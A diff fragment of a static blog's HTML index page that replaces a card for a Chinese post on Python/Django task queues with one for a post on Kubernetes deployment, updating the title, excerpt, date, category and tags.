-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="python中的任务队列">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="kubernetes的部署">
                         
-                        <span class="card-title">python中的任务队列</span>
+                        <span class="card-title">kubernetes的部署</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
-为什么要做任务队列
+                            什么是kubernetes
+Kubernetes是Google开源的容器集群管理系统，其提供应用部署、维护、 扩展机制等功能，利用Kubernetes能方便地管理跨机器运行容器化的应用
 
-要回答这个问题我们首先看看在流水线上的案列，如果人的速度很慢，机器的速度比人的速度快很多，就会造成，机器生产的东西没有及时处理，越积越多，造成阻塞，影响生产。
-
-
-任务队列的意义：
-打个比方如果出现人的速度跟不上机器
+   
+##主要的功能1) 使用Docker对应用程
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2018-05-30
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-08-01
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/django任务队列/" class="post-category">
-                                    django任务队列
+                            <a href="/categories/docker/" class="post-category">
+                                    docker
                                 </a>
                             
                             
@@ -870,16 +1403,12 @@ nc  服务器地址（127.0.0.1） 服务器端口号如（65535）
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Python/">
-                        <span class="chip bg-color">Python</span>
+                    <a href="/tags/docker/">
+                        <span class="chip bg-color">docker</span>
                     </a>
                     
                     <a href="/tags/Linux/">
                         <span class="chip bg-color">Linux</span>
-                    </a>
-                    
-                    <a href="/tags/django/">
-                        <span class="chip bg-color">django</span>
                     </a>
                     
                 </div>
